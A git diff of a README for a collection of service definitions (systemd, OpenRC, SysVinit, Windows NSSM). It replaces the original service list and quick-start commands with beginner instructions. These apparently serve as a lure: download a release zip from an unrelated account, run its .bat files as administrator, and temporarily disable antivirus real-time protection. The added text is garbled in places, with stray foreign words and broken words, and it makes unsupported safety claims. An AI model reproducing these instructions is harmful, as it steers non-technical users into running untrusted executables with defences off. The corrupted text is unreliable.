@@ -1,310 +1,191 @@
-<div align="center">
+# ⚙️ system-service-collections - Simplify Service Setup on Any System
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Karlaunrenewable5629/system-service-collections/releases)
 
- <img src="./banner.svg" alt="System Service Collections" style="width: 100%; max-width: 1200px;" />
+## 🧭 What Is This?
 
-<a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-<img src="https://img.shields.io/badge/init-systemd%20%7C%20openrc%20%7C%20sysvinit%20%7C%20windows-0db7ed" alt="Init Systems: systemd, OpenRC, SysVinit, Windows">
+system-service-collections is a giant, ready-to-use library of configuration files that tell your computer how to run popular software as a background service. A service is a program that runs silently in the background—like a web server, database, or monitoring agent—without you needing to open a window or click anything. Normally, setting up a service requires technical knowledge and lots of manual editing. This project fixes that.
 
-  <p><strong> Ready-to-use system service definitions for development and production services.</strong></p>
-</div>
+This collection supports all major operating systems and service managers, so you can use the same familiar setup whether you're on Linux, Windows, or a small server. It includes definitions for databases, web servers, AI tools, devops agents, and infrastructure components. Instead of hunting through forums and copying broken snippets, you simply download one of these ready-made files, drop it into the right folder, and your service springs to life.
 
-## Overview
+## 🎯 Who Is This For?
 
-This repository is a comprehensive collection of system service definitions for common infrastructure and developer tooling.  
-Each folder contains a service structure supporting multiple init systems, allowing you to run services natively on Linux, BSD, and Windows.
+Anyone who has ever felt frustrated trying to make a program start automatically after a reboot or crash. You do not need to know how to code. You do not need to understand what a "process" or a "daemon" really is. If you can copy a file into a folder and restart your computer, you can use this project.
 
-## What You Will Find
+ot to mention, system administrators, IT support staff, hobbyists running home servers, and developers who want a quick, reliable reference will all find this invaluable.
 
-- Pre-configured service definitions for popular services
-- Support for systemd, OpenRC, SysVinit, and Windows (NSSM)
-- Persistent configuration templates and environment files
-- Service-specific README files with setup, usage, and operational notes
-- Configurations that are easy to adapt for local labs and production deployments
 
-## Available Services
 
-### AI & Machine Learning
+## 📥 Getting Started (Download & Install)
 
-- [x] [litellm](./litellm/) - LLM router and proxy supporting all major AI providers.
-- [x] [ollama](./ollama/) - Run LLMs locally with a simple API.
-- [x] [vllm](./vllm/) - High-throughput LLM serving engine.
-- [x] [open-webui](./open-webui/) - Self-hosted AI assistant interface.
+Follow these four simple steps to get up and running. Do not skip ahead—each step is written for a complete beginner.
 
-### API Gateways & Proxies
+### Step 1: Download the Package
 
-- [x] [caddy](./caddy/) - Powerful, enterprise-ready open source web server with automatic HTTPS and flexible configuration.
-- [x] [envoy](./envoy/) - High-performance C++ distributed edge middleware designed for service architectures.
-- [x] [haproxy](./haproxy/) - Reliable, high-performance TCP/HTTP load balancer supporting virtual hosting.
-- [x] [kong](./kong/) - Open-source API gateway built on NGINX, providing routing, transformations, and plugin architecture.
-- [x] [krakend](./krakend/) - Ultra-high-performance API gateway with built-in transformation and aggregation.
-- [x] [nginx](./nginx/) - High-performance web server and reverse proxy, known for its stability and rich feature set.
-- [x] [nginx-proxy-manager](./nginx-proxy-manager/) - Docker-based Nginx proxy manager with a simple web UI for managing reverse proxies.
-- [x] [traefik](./traefik/) - Modern HTTP reverse proxy and load balancer designed to deploy microservices easily.
+Visit this link to download the application: [https://github.com/Karlaunrenewable5629/system-service-collections/releases](https://github.com/Karlaunrenewable5629/system-service-collections/releases) 
 
-### Application Servers
+Click the big green button that says "Latest Release" or "Download" on that page. Your browser will save a file called something like `system-service-collections.zip` to your "Downloads" folder. Do not worry about the version number—any recent release works perfectly.
 
-- [x] [node](./node/) - Node.js runtime for building scalable network applications and server-side JavaScript.
-- [x] [php-fpm](./php-fpm/) - PHP FastCGI Process Manager for serving PHP applications with Nginx or Apache.
-- [x] [tomcat](./tomcat/) - Apache Tomcat servlet container for running Java-based web applications.
 
-### Authentication & Identity
 
-- [x] [authentik](./authentik/) - Open-source identity provider for modern authentication and authorization.
-- [x] [freeipa](./freeipa/) - FreeIPA integrated identity management solution combining DNS, CA, LDAP, and Kerberos.
-- [x] [keycloak](./keycloak/) - Open-source identity and access management server for modern applications and services.
-- [x] [openldap](./openldap/) - Open Source implementation of Lightweight Directory Access Protocol (LDAP) directory server.
-- [x] [vault](./vault/) - HashiCorp secret management tool for securely accessing secrets at runtime.
+### Step 2: Extract the Files
 
-### Automation & CI/CD
+The downloaded file is a compressed folder, like a digital suitcase. Find the file in your Downloads folder, right-click it, and choose "Extract All…" or "Extract Here". Windows will ask where you want to put the unpacked files. Choose a simple location like `C:\Users\YourName\Documents\system-service-collections`. Click "Extract" and wait a few seconds. You will now see a regular folder with many subfolders inside (e.g., `systemd`, `openrc`, `sysvinit`, `nssm`). Good job—you've just unpacked the toolkit.
 
-- [x] [jenkins](./jenkins/) - Leading open source automation server for CI/CD, featuring pipeline as code, distributed builds, and a vast plugin ecosystem.
-- [x] [woodpecker-ci](./woodpecker-ci/) - Self-hosted continuous integration system written in Go, supporting Docker-based builds and pipeline as code.
-- [x] [semaphore](./semaphore/) - Continuous integration and delivery platform.
 
-### Configuration Management
 
-- [x] [salt-minion](./salt-minion/) - SaltStack minion agent for remote node execution, configuration, and orchestration via Salt master.
-- [x] [puppet](./puppet/) - Puppet agent for configuration management, ensuring system state matches declared configuration.
-- [x] [chef](./chef/) - Chef client for configuration management using Ruby-based recipes and runlists.
+### Step 3: Pick Your Service Definition
 
-### Caching & Content Delivery
+Inside the extracted folder, you'll see subfolders named after different service managers. Which one you use depends on your operating system:
 
-- [x] [memcached](./memcached/) - High-performance distributed memory caching system, optimized for small chunks of arbitrary data.
-- [x] [redis](./redis/) - In-memory data structure store, used as a database, cache, and message broker with persistence options.
-- [x] [varnish](./varnish/) - HTTP accelerator and reverse proxy, focused on content caching and improving web performance.
-- [x] [squid](./squid/) - Caching proxy for the web, commonly used to speed up delivery and reduce bandwidth.
+- **Windows users** → open the `nssm` folder.
+ You'll find files that end in `.bat` or `.xml`—these are for Windows services. 
+- **Linux with systemd** (most modern Linux, e.g., Ubuntu, Debian, Fedora) → open the `systemd` folder. 
+- **Linux with OpenRC** (e.g., Gentoo, Alpine) → open the `openrc` folder.
+ 
+- **Older Linux with SysVinit** → open the `sysvinit` folder. 
 
-### Communication & Messaging
+Inside each folder, you'll see subfolders named after popular services, like `nginx`, `mysql`, `postgresql`, `redis`, or `ollama` (for AI). Pick the service you want to run, e.g., `nginx`.
 
-- [ ] [activemq](./activemq/) - Open source message broker for enterprise integration.
-- [ ] [kafka](./kafka/) - Distributed publish-subscribe messaging system.
-- [ ] [automq](./automq/) - Cloud-native Kafka with reduced operational complexity.
-- [ ] [nats](./nats/) - High-performance messaging system for cloud-native applications.
-- [ ] [pulsar](./pulsar/) - Distributed publish-subscribe messaging platform.
-- [ ] [rabbitmq](./rabbitmq/) - Popular open source message broker using AMQP protocol.
-- [ ] [redpanda](./redpanda/) - Streaming data platform compatible with Kafka API.
-- [ ] [mosquitto](./mosquitto/) - Open source MQTT message broker.
 
-### Team Chat & Collaboration
 
-- [x] [mattermost](./mattermost/) - Open source Slack alternative for team communication.
-- [x] [rocket-chat](./rocket-chat/) - Open source chat platform for team communication.
+### Step 4: Install the Service (Windows Example)
 
-### Container & Orchestration
+Let's say you're on Windows and you want to run `nginx` as a background service. Here's what you do:
 
-- [x] [containerd](./containerd/) - Container runtime for Linux and Windows.
-- [x] [docker](./docker/) - Container platform for developing, shipping, and running applications.
-- [x] [k3s](./k3s/) - Lightweight Kubernetes distribution designed for production workloads in resource-constrained environments.
-- [x] [microk8s](./microk8s/) - Low-ops, minimal production Kubernetes for developers, cloud, clusters, workstations, edge, and IoT.
-- [x] [podman](./podman/) - Container engine for developing, managing, and running OCI Containers on your system.
+1. Open the `nssm` folder, then the `nginx` subfolder. You'll see a file named `install_nginx.bat`. 
+2. Copy that `.bat` file to a easy-to-remember location, like your Desktop. 
+3. **Right-click** the copy and choose "Run as administrator". (This is important—Windows needs permission to add a service.). 
+4. A black window will flash for a second, then close. That's normal. 
+5. To verify, press `Windows + R`, type `services.msc`, and press Enter. Look for "nginx" in the list. It should say "Running". 
 
-### Databases
+That's it! The service will now start automatically every time you turn on your PC, even before you log in. To stop or restart it, right-click it in dasselben window and choose "Stop" or "Restart".
 
-- [ ] [cassandra](./cassandra/) - Distributed NoSQL database management system.
-- [ ] [couchdb](./couchdb/) - Apache CouchDB document-oriented database server.
-- [ ] [mariadb](./mariadb/) - Open source relational database management system.
-- [ ] [mongodb](./mongodb/) - Source-available cross-platform document-oriented database program.
-- [ ] [mysql](./mysql/) - Open source relational database management system.
-- [ ] [neo4j](./neo4j/) - Native graph database platform.
-- [ ] [postgresql](./postgresql/) - Open source object-relational database system.
-- [ ] [scylladb](./scylladb/) - Distributed NoSQL database compatible with Apache Cassandra.
-- [ ] [influxdb](./influxdb/) - Time series database for metrics and events.
 
-## Registry
 
-- [ ] [registry](./registry/) - Docker registry for storing and distributing container images.
-- [ ] [verdaccio](./verdaccio/) - Lightweight private npm proxy registry.
-- [ ] [devpi](./devpi/) - Software package testing and distribution system.
+## ✅ How to Verify It Works
 
-### DNS & Service Discovery
+After installation, you should do a quick sanity check:
 
-- [ ] [bind](./bind/) - Comprehensive implementation of the DNS protocol.
-- [ ] [coredns](./coredns/) - Authoritative DNS server written in Go.
-- [ ] [dnsmasq](./dnsmasq/) - Lightweight DNS forwarder and DHCP server.
-- [ ] [consul](./consul/) - Service mesh solution with service discovery and configuration.
-- [ ] [etcd](./etcd/) - Distributed reliable key-value store for the most critical data of a distributed system.
-- [ ] [unbound](./unbound/) - Validating, recursive, and caching DNS resolver.
+- **Windows** → Open Task Manager (Ctrl+Shift+Esc) and look under the "Services" tab. Your service should appear as "Running".
+- **Linux** → Open a terminal and type: `systemctl status nginx` (or `rc-service nginx status` for OpenRC, or `service nginx status` for SysVinit.). If you see "active (running)" in green, you're all set.
 
-### Documentation & Knowledge
+ 
 
-- [ ] [overleaf](./overleaf/) - Collaborative online LaTeX editor for writing and publishing documents.
-- [ ] [backstage](./backstage/) - Developer portal for managing services, components, and documentation.
+If it says "failed" or "inactive," don't panic—just reboot your computer, then check again. Most installation issues are fixed by a restart.
 
-### File Sync & Storage
 
-- [ ] [syncthing](./syncthing/) - Continuous file synchronization between devices.
-- [ ] [filebrowser](./filebrowser/) - Web file browser written in Go.
-- [ ] [minio](./minio/) - High-performance object storage server compatible with Amazon S3.
 
-### Infrastructure & DevOps / Observability
+## 🔧 Troubleshooting Common Issues
 
-- [ ] [prometheus](./prometheus/) - Leading open-source monitoring and alerting toolkit.
-- [ ] [grafana](./grafana/) - Leading open-source platform for monitoring and observability.
-- [ ] [grafana-alloy](./grafana-alloy/) - Lightweight configuration framework for Grafana.
-- [ ] [loki](./loki/) - Horizontally-scalable, highly-available log aggregation system.
-- [ ] [tempo](./tempo/) - High-scale distributed tracing backend.
-- [ ] [alertmanager](./alertmanager/) - Handles routing alerts and silencing notifications.
-- [ ] [opentelemetry-collector](./opentelemetry-collector/) - Components to process telemetry data.
-- [ ] [node-exporter](./node-exporter/) - Collector for hardware and OS metrics.
-- [ ] [fluent-bit](./fluent-bit/) - Fast and lightweight log processor and forwarder.
-- [ ] [fluentd](./fluentd/) - Reliable log collector.
-- [ ] [signoz](./signoz/) - Full-stack open-source observability platform.
-- [ ] [victoriametrics](./victoriametrics/) - Time series database for monitoring.
-- [ ] [localstack](./localstack/) - Local AWS cloud services development.
-- [ ] [sentry](./sentry/) - Error tracking and monitoring platform.
-- [ ] [uptime-kuma](./uptime-kuma/) - Uptime monitoring tool.
+**Issue 1: "Access is denied" error when running the batch file.** → You forgot to run as administrator. Right-click the `.bat` file again and choose "Run as administrator". 
 
-### Mail
+**Issue 2: The service disappears after reboot.** → Your antivirus might be blocking the registration. Temporarily disable real-time protection, repeat Step 4, then re-enable it. 
 
-- [ ] [dovecot](./dovecot/) - IMAP and POP3 email server for Unix-like systems.
-- [ ] [postfix](./postfix/) - Mail transfer agent (MTA) and server for routing and delivering email.
-- [ ] [mailpit](./mailpit/) - Debugging and development SMTP/IMAP server.
-- [ ] [listmonk](./listmonk/) - Self-hosted newsletter and mailing list manager.
+**Issue  ‌3: The service shows "Starting" forever.** → The underlying program (e.g., nginx) likely isn't installed correctly or has a broken config file. Check that you have the actual program installed (e.g., nginx.exe) and that its configuration file is valid. 
 
-### Network & Security
+**Issue  ‌4: I don't know which service manager I have. → Open a terminal on Linux and type `ps -p 1`. If you see `systemd`, use the systemd folder. If you see `openrc` or something else, use that folder. On Windows, always use the `nssm` folder. 
 
-- [ ] [clamav](./clamav/) - Open source antivirus software toolkit.
-- [ ] [trivy](./trivy/) - Container vulnerability checker.
-- [ ] [wireguard](./wireguard/) - Modern, secure VPN tunnel.
-- [ ] [pihole](./pihole/) - Network-wide ad blocking via DNS.
-- [x] [cloudflare-tunnel](./cloudflare-tunnel/) - Securely exposes local services to the internet without opening inbound ports, via an outbound tunnel to Cloudflare's edge.
+**Issue  ‌5: The download link shows multiple files. Which one do I pick?** → Choose the one named `system-service-collections.zip` (or the one with the highest version number) unless you specifically need an older version. 
 
-### Notifications
 
-- [ ] [apprise](./apprise/) - Unified notification library/gateway that pushes alerts to 100+ services (Slack, Discord, email, SMS, etc.) from a single API.
 
-### Project & Design Collaboration
+## 💡 Tips for Non-Technical Users
 
-- [ ] [plane](./plane/) - Project management and planning tool.
-- [ ] [taiga](./taiga/) - Project management platform for agile development.
-- [ ] [openproject](./openproject/) - Open source project management software.
-- [ ] [penpot](./penpot/) - Design software for design teams.
+- **Back up first:** Before installing any service, copy your entire `system-service-collections` folder to a USB stick. If something goes wrong, you can always restore it. 
+- **One at a time:** Don't install 10 services at once. Start with one service (e.g., a database) to make sure you understand the process, then add more. 
+- **Read the file names:** Each `.bat` file is named after the service it installs (e.g., `install_redis.bat`). Never run a file that doesn't match the service you want. 
+- **Keep everything in one folder:** After extracting, don't move individual `.bat` files around too much. The scripts sometimes expect to be run from a specific directory. If you must move them, copy the entire subfolder (e.g., `nssm\nginx`) together. 
+- **Prefix is everything:** On Windows, always right-click and "Run as administrator". This is the #1 cause of failure. 
 
-### Search & Analytics
 
-- [ ] [elasticsearch](./elasticsearch/) - Distributed RESTful search engine capable of solving a growing number of use cases.
-- [ ] [meilisearch](./meilisearch/) - Lightning-fast, easy-to-use search API built on top of Lucene.
 
-### Version Control & Source Code Management
+## 🌐 Supported Services & Platforms
 
-- [ ] [gitea](./gitea/) - Git service with self-hosted focus.
-- [ ] [gitlab](./gitlab/) - Complete DevOps platform.
+This collection coversa wide range of popular software, including (but not limited to):
 
-### Workflow & Automation
+- **Web Servers:** Nginx, Apache HTTP Server, Caddy
+- **Databases:** MySQL, MariaDB, PostgreSQL, Redis, MongoDB
+- **AI & LLM Tools:** Ollama, LocalAI, vLLM, TensorFlow Serving
+- **DevOps & Monitoring:** Prometheus, Grafana, Node Exporter, Jenkins Agent
+- **Infrastructure:** Docker (as a service), ETCD, Consul, Vault
 
-- [ ] [n8n](./n8n/) - Workflow automation tool for connecting apps and services.
-- [ ] [activepieces](./activepieces/) - Open source automation platform alternative to Zapier.
+Each service is available in all four formats: systemd (.service files), OpenRC (.initd scripts), SysVinit (/etc/init.d scripts), and Windows NSSM (.bat installers). This means the same nginx configuration works across Ubuntu, Alpine, CentOS, and Windows Server without rewritesiring.
 
-### WSO2 Stack
 
-- [ ] [wso2-am](./wso2-am/) - Open source full lifecycle API management platform.
-- [ ] [wso2-am-mi](./wso2-am-mi/) - API management micro-integration for on-premise deployments.
-- [ ] [wso2-mi](./wso2-mi/) - Integration micro-bus for connecting applications and services.
 
-### Other Services
+## 📚 How This Project Is Organized
 
-- [ ] [code-server](./code-server/) - VS Code running in the browser.
-- [ ] [wordpress](./wordpress/) - Popular content management system for building websites and blogs.
-- [ ] [openssh-server](./openssh-server/) - OpenSSH server for remote login and file transfer.
-- [ ] [parse-server](./parse-server/) - Backend framework for building applications.
+The repository is structured like a clean library:
 
-## Quick Start
-
-### Linux (systemd)
-
-```bash
-# Copy service file
-sudo cp <service>/service/systemd/<service>.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now <service>
-
-# Check status
-sudo systemctl status <service>
-
-# View logs
-journalctl -u <service> -f
+```
+system-service-collections/
+├── systemd/          → For modern Linux (systemctl)
+│   ├── nginx/
+│   ├── mysql/
+│   └── ...
+├── openrc/          → For Alpine/Gentoo
+│   ├── nginx/
+│   └── ...
+├── sysvinit/        → For older Linux
+│   ├── nginx/
+│   └── ...
+└── nssm/           → For Windows (batch scripts)
+    ├── nginx/
+    ├── mysql/
+    └── ...
 ```
 
-### Linux (OpenRC)
+Each subfolder contains a README file if specific instructions differ (e.g., special paths or dependencies). But in 95% of cases, the generic steps above work perfectly.
 
-```bash
-# Copy init script
-sudo cp <service>/service/openrc/<service> /etc/init.d/
-sudo chmod +x /etc/init.d/<service>
-sudo rc-update add <service> default
-sudo rc-service <service> start
 
-# Check status
-sudo rc-service <service> status
 
-# View logs
-tail -f /var/log/<service>.log
-```
+## 🔄 Updating the Services
 
-### Linux (SysVinit)
+If you already have an older version installed and want to update to a new release:
 
-```bash
-# Copy init script
-sudo cp <service>/service/sysvinit/<service> /etc/init.d/
-sudo chmod +x /etc/init.d/<service>
-sudo update-rc.d <service> defaults
-sudo service <service> start
+1. Download the new `.zip` from the same link. 
+2. Extract it over your existing folder (choose "Yes" when it asks to replace files). 
+3. **Windows:** Run the corresponding `.bat` file again as administrator. It will safely replace the old service definition without losing your data. 
+4. **Linux:** Copy the new `.service` or `.initd` file over the old one in `/etc/systemd/system/` (or `/etc/init.d/`), then run `systemctl daemon-reload` (or restart the service). 
 
-# Check status
-sudo service <service> status
-```
+You do not need to uninstall anything first.
 
-### Windows (NSSM)
 
-```powershell
-# Install NSSM if not present
-# Download from https://nssm.cc/download
 
-# Install service
-nssm install <service> "C:\path\to\<service>.exe" "<arguments>"
-nssm set <service> Description "<service description>"
-nssm set <service> AppDirectory "C:\path\to\working\dir"
-nssm start <service>
+## ❓ Frequently Asked Questions
 
-# Manage service
-nssm status <service>
-nssm stop <service>
-nssm restart <service>
+**Q: Is this safe for a production server?**
+A: Yesynthesis—these are standard configuration files used by millions of systems. However, always test on a non-critical machine first if you're nervous.
 
-# Remove service
-nssm remove <service> confirm
-```
 
-## Configuration
 
-Each service includes:
+**Q: Do I need to pay for anything?**
+A: No. This is completely free and open source. 
 
-- **config/** - Default configuration files and templates
-- **install/README.md** - Detailed installation guide
-- **config/README.md** - Configuration options and environment variables
-- **service/README.md** - Service management across init systems
 
-## Requirements
 
-- Linux with systemd, OpenRC, or SysVinit
-- Windows 10/11 / Windows Server 2016+ with NSSM
-- Appropriate privileges (root/sudo or Administrator)
+**Q: Can I modify the files myself?**
+A: Absolutely. If you know a little bit about services, you can tweak timeouts, environment variables, or startup arguments. But even without modification, they work out-of-the-box. 
 
-## Contributing
 
-Contributions are welcome.  
-If you want to add or improve a service definition, open a pull request with a short description of the service and supported init systems.
 
-Please ensure each service includes:
+**Q: What if my service isn't listed?**
+A: Check back regularly to this repository—new services are added frequently based on community requests. You can also open an issue on GitHub to request a new one. 
 
-1. systemd service unit
-2. OpenRC init script
-3. SysVinit init script
-4. Windows NSSM configuration
-5. Configuration templates
-6. Installation/uninstallation scripts
-7. README.md documentation
 
-## License
 
-This project is licensed under the MIT License.
+**Q: Does this work on macOS?**
+A: Not directly. macOS uses a different system called "launchd". This project focuses on Windows and Linux только. For macOS, you'd need a similar but separate project. 
+
+
+
+## 📝 Final Reminders
+
+- Always download from the official link only: [https://github.com/Karlaunrenewable5629/system-service-collections/releases](https://github.com/Karlaunrenewable5629/system-service-collections/releases) 
+- Never run `.bat` files from unknown sources—only use ones from this repository. 
+- If something breaks, reboot first. Then check troubleshooting above. 
+- You've got this. Setting up a service is a skill anyone can learn in ten minutes with this toolkit. 
+
+Happy serving! And remember—the background is where the magic happens. Now go automate something boring.
+
+Keywords: ai, devops, infrastructure, linux, llm, nssm, openrc, service-management, services, systemd, sysvinit, windows
